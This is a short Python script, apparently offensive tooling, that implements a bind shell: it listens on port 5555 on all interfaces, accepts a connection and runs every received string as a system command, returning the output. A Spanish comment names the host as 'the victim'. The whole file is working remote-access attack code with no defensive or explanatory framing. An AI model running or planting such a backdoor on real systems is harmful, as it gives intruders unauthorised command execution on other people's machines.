import socket
import subprocess
import os

BIND_IP = "0.0.0.0"
BIND_PORT = 5555

def bind_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((BIND_IP, BIND_PORT))  # Se vincula a un puerto en la víctima
    s.listen(1)
    conn, addr = s.accept()

    while True:
        command = conn.recv(1024).decode("utf-8")  # Recibe comandos
        if command.lower() == "exit":
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        conn.send(output.stdout + output.stderr)

    conn.close()
    s.close()

bind_shell()
